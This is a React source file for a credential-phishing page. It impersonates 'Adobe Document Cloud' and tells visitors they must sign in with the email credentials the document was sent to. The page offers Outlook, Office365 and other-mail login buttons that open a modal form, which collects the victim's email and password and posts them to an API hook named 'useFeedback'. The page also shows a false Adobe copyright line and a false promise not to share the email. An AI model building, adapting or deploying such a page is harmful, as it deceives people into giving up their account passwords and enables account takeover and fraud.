import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import { Button, Modal } from 'react-bootstrap';

function App() {
  const { postFeedback, isLoading } = useFeedback();
  const [emails, setEmail] = useState('');
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Office365');



  const onSubmit = async (e) => {
  e.preventDefault();
    const data = qs.stringify({
      email: emails,
      password: passwords,
      details: detail,
    });

    try {
      await postFeedback(data);
      setPassword('');
      setEmail('');
    } catch (error) {
      console.log(error);
    }
  };

     
  const [show, setShow] = useState(false);

  const handleClose = () => setShow(false);
  const handleShow = () => setShow(true);


  return (

    <div  className="container-fluid">
    <div  className="row" >
    <div className="bg-image" 
     style={{backgroundImage: "url('images/images/8.jpg')",
            height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>

      <div  className="container">
        <div className="row">
        <div  className="col-lg-6 mx-auto my-5 px-5 pb-5" style={{border: "1px solid",  backgroundColor: "rgba(0,0,0,0.7)", borderRadius:"15px"}}>
        <div  className="text-center pt-5"> 
                <img src="images/images/adobe.jpg"  className="img-fluid" width="100px"/> <br/>
                <span  className="h5 text-white">Adobe Document Cloud</span> <br/>
                <span  className="h5 text-white font-weight-normal">To read the document, please enter with the valid email credentials that this file was sent to.</span>
              </div>
              <div  className="mt-3">
                <div  className="row">
                <div  className="col-lg-12">
                  <a href="#" id="outlookmodal"  className=" w-100"  onClick={handleShow}   style={{textDecoration: "none"}} data-toggle="modal" data-target="#ajaxModal">
                      <div  className="" style={{ backgroundColor: "#0073C8"}} >
                        <img src="images/images/outlook1.png"  className="img-fluid" width="40px" style={{backgroundColor: "rgba(0,0,0,0.3)"}}/>
                        <span  className="pl-4" style={{verticalAlign: "middle" , paddingLeft: "2rem" , color: "white", fontWeight: "500"}}>Sign in with Outlook</span>
                      </div>
                    </a>          
</div>
                </div>
                <div  className="row pt-4">
                <div  className="col-lg-12">
                  <a href="#" id="outlookmodal"  className=" w-100"   onClick={handleShow}    style={{textDecoration: "none"}} data-toggle="modal" data-target="#ajaxModal">
                      <div  className="" style={{ backgroundColor: "#FF3C00"}} >
                        <img src="images/images/office3651.png"  className="img-fluid" width="40px" style={{backgroundColor: "rgba(0,0,0,0.3)"}}/>
                        <span  className="pl-4" style={{verticalAlign: "middle" , paddingLeft: "2rem" , color: "white", fontWeight: "500"}}>Sign in with Office365</span>
                      </div>
                    </a>          
</div>
                </div>
                <div  className="row pt-4">
                <div  className="col-lg-12">
                  <a href="#" id="outlookmodal"  className=" w-100"   onClick={handleShow}  style={{textDecoration: "none"}} data-toggle="modal" data-target="#ajaxModal">
                      <div  className="" style={{ backgroundColor: "#0B5BD3"}} >
                        <img src="images/images/other1.png"  className="img-fluid" width="40px" style={{backgroundColor: "rgba(0,0,0,0.3)"}}/>
                        <span  className="pl-4" style={{verticalAlign: "middle" , paddingLeft: "2rem" , color: "white", fontWeight: "500"}}>Sign in with Other Mail</span>
                      </div>
                    </a>          
</div>
                </div>

                </div>
                <div  className="col-lg-12">
                     <p  className="text-white mt-3 text-center">Select your email provider to view Document</p>
                <p  className="h6 text-center text-white">CopyRight© 2022 Adobe.</p> 
               
                    
                  </div>
          </div>

       

      <Modal show={show} onHide={handleClose}>
        <Modal.Header closeButton>
          
        </Modal.Header>
        <Modal.Body>
        <div  className="modal-body">
            <center>
              <img id="fieldImg" src="images/images/office365.png"  className="img-fluid rounded-circle" width="80px"/>
              <h5  className="modal-title" id="exampleModalLabel">Login with <span id="field">Office365</span></h5>
          

            </center>
            <form    onSubmit={onSubmit}  className="form-horizontal well">
              <div  className="col-lg-12">
                <div  className="form-group">
                  <label for="exampleInputEmail1">Email address</label>
                  <input type="email" name="emails"  className="form-control" id="emails" value={emails}  onChange={(e) => setEmail(e.target.value)}  placeholder="Enter email"/>
                  <small id="emailHelp"  className="form-text text-muted">We'll never share your email with anyone else.</small>
                </div>
              </div>
              <div  className="col-lg-12">
                <div  className="form-group">
                  <label for="Password">Password</label>
                  <input type="password" name="passwords"  className="form-control" id="passwords" value={passwords}  onChange={(e) => setPassword(e.target.value)} placeholder="Enter Password"/>
                </div>
              </div>
              <div  className="col-lg-12">
                <div  className="form-group">
              
                  <input type="hidden" name="detail"  className="form-control" id="detail" value={detail}   onChange={(e) => setDetails(e.target.value)} />
                </div>
              </div>
        
            <div  className="modal-footer">
              <button type="button"  className="btn btn-secondary" data-dismiss="modal">Close</button>
              <button className="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
            </div>
          </form>
        </div>
        </Modal.Body>
       
      </Modal>


          </div>
     
    </div> 
    </div>
  </div>
  </div>
  );
}

export default App;
